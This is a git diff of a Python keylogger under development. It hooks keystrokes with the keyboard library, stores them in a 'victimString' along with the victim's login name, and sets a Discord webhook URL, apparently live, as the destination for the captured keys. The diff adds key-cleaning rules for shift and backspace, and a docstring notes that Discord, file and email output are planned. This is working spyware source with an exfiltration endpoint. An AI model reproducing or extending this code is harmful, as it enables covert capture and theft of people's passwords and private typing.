@@ -1,12 +1,9 @@
 import keyboard, os
-import discord
-from discord.ext import commands
 from threading import Timer
-from datetime import datetime
 
 #will need to post directly to webhook since i want to run in thread
 WEBHOOK = "https://discord.com/api/webhooks/828777990267338763/2tCn0R5OIniq2uNhPYmowWDuemiyi0iZKaVVmyN5aPCZMT_qvwjqtTQZJtMdeY4eKlNM"
-INTER = 0.01
+INTER = 5
 
 class Keylogger:
     def __init__(self, interval, method="discord"):
@@ -14,8 +11,15 @@ class Keylogger:
         self.method = method
         self.victimString = ''
         self.victimName = os.getlogin()
-        self.startTime = datetime.now().strftime('%d/%m/%Y %H:%M')
-        self.endTime = datetime.now().strftime('%d/%m/%Y %H:%M')#placeholder time object
+
+    def outputKeys(self):
+        """
+        this will be changed to output to discord as soon as
+        I connect this class with the controller. Also wanting to provide
+        support for outputting to file/email in stretch.
+        """
+        print(self.victimString)
+        self.victimString = ''
 
     def cleanPresses(self, event):
         """
@@ -29,11 +33,11 @@ class Keylogger:
                 n = '.'
             elif n == "enter":
                 n = "[ENTER NEW LINE]\n"
+            elif n == "shift":
+                n = ''
+            elif n == "backspace":
+                n = '\n[back]'
         self.victimString += n
-
-    def outputKeys(self):
-        print(self.victimString)
-        self.victimString = ''
 
     def startTimer(self):
         if self.victimString:
